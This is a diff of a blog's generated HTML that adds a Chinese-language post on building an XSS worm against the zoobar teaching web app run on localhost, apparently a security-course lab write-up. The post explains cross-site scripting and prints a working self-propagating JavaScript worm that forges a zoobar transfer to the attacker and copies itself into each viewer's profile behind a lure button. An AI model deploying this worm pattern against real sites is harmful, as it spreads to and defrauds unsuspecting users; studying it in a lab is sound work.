@@ -238,6 +238,142 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/12/22/XSS-worm/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="itachi">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Twilighce">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Twilighce" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/22/XSS-worm/" itemprop="url">
+                  XSS worm
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-22T23:15:59+08:00">
+                2016-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>###一、XSS攻击原理</p>
+<ul>
+<li>XSS又称CSS，全称Cross Site Script，跨站脚本攻击，是Web程序中常见的漏洞。</li>
+<li>原理是攻击者向有 XSS漏洞的网站中输入(传入)恶意的代码，当其它用户浏览该网站时，这段代码会自动执行，从而达到攻击的目的。如：盗取用户 Cookie、破坏页面结构、重定向到其它网站等。</li>
+</ul>
+<p>###二、环境配置</p>
+<ol>
+<li>linux环境下， 安装apache2、mysql,、php5。</li>
+<li>将myzoo文件部署到apache2服务器上，注意在mysql中创建的数据库和表，要和zoobar网站源码中对应。</li>
+</ol>
+<p>###三、利用javascript实现实现XSS worm</p>
+<p>####1、攻击原理</p>
+<ul>
+<li>在zoobar网站上注册了用户A、B。其中A作为攻击者。A、B资料页面都有profile栏可供输入。理论上，所有可输入的地方如果没有对输入数据进行处理，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力。</li>
+<li>当B看A的简介时，B的一个zoobar被转移给A。此时是在B的登陆页面，B看A的简介时执行了一段脚本，该脚本发送给服务器，是以自己的cookie发送的，因此该脚本的作用是伪造一个请求，以B的名义，向服务器发送转移zoobar的表单。</li>
+<li>当用户B看A的简介时，自己的简介会被改动，说明A伪造了一个请求，提交给服务器，修改了B的简介。我们要看当B保存自己的简介，点击save按钮时，向服务器传送的请求时什么，然后根据该请求伪造。</li>
+</ul>
+<p>####2、攻击实现<br>在A的profile中输入如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">&lt;script id=sc1&gt;</div><div class="line">function Steel() //转移受害者的一个zoobar给攻击者</div><div class="line">&#123;</div><div class="line">	var steelURL=&quot;https://localhost/transfer.php&quot;;  //提交给服务器端的哪一个文件，这里的地址是需要我们伪造的</div><div class="line">	var postStr1=&quot;zoobars=1&amp;recipient=a&amp;submission=Send&quot;;  //需要我们伪造，写的是默认转移一个zoobar给用户a</div><div class="line">	var ajax1=null;</div><div class="line">	if(window.XMLHttpRequest)</div><div class="line">	&#123;</div><div class="line">		ajax1=new XMLHttpRequest();</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">		return;</div><div class="line">	ajax1.open(&quot;POST&quot;,steelURL,true);</div><div class="line">	ajax1.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">	ajax1.send(postStr1);</div><div class="line">&#125;</div><div class="line">function Update()  //更新受害者的profile和攻击者一样</div><div class="line">&#123;</div><div class="line">	var updateURL=&quot;https://localhost/index.php&quot;;  </div><div class="line">	var ajax2=null;</div><div class="line">	if(window.XMLHttpRequest)</div><div class="line">	&#123;</div><div class="line">		ajax2=new XMLHttpRequest();</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">		return;</div><div class="line">	ajax2.open(&quot;POST&quot;,updateURL,true);</div><div class="line">	var script=document.getElementById(&quot;sc1&quot;).innerHTML;</div><div class="line">	var script_clean = encodeURIComponent(script); </div><div class="line">	var postStr2=&quot;profile_update=&quot;;</div><div class="line">	postStr2=postStr2.concat(&quot;&lt;scr&quot;); </div><div class="line">	postStr2=postStr2.concat(&quot;ipt &quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;id=sc1&gt;&quot;);</div><div class="line">	postStr2=postStr2.concat(script_clean);</div><div class="line">	postStr2=postStr2.concat(&quot;&lt;/scr&quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;ipt&gt;&quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;&lt;button type=button onclick=&#123;Steel();Update()&#125;&gt;IPHONE 7&lt;button&gt;&quot;);</div><div class="line">	postStr2=postStr2.concat(&quot;&amp;profile_submit=Save&quot;);</div><div class="line">	ajax2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">	ajax2.send(postStr2);</div><div class="line"></div><div class="line">	ajax2.onreadystatechange=function()</div><div class="line">	&#123;</div><div class="line">		if(ajax2.readyState==4&amp;&amp;ajax2.status==200)</div><div class="line">		&#123;</div><div class="line">			alert(&quot;Uha!Your zoobar is mine!&quot;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">/* </div><div class="line"> * 为使代码可运行，在zoobar网站的users.php文件中allowed_tags里加上&lt;script&gt;标签、&lt;button&gt;标签，</div><div class="line"> * disallow里注释掉javascript和button,</div><div class="line"> */</div><div class="line">/* </div><div class="line"> * 创建了一个button，当点击该button时，执行的是一个function，该function伪造了一个表单请求提交给服务器</div><div class="line"> */</div><div class="line">&lt;/script&gt;&lt;button type=button onclick=&#123;Steel();Update()&#125;&gt;IPHONE 7&lt;/button&gt;</div></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/12/22/hello-world/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -399,7 +535,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-count">2</span>
                 <span class="site-state-item-name">Artikel</span>
               </a>
             </div>
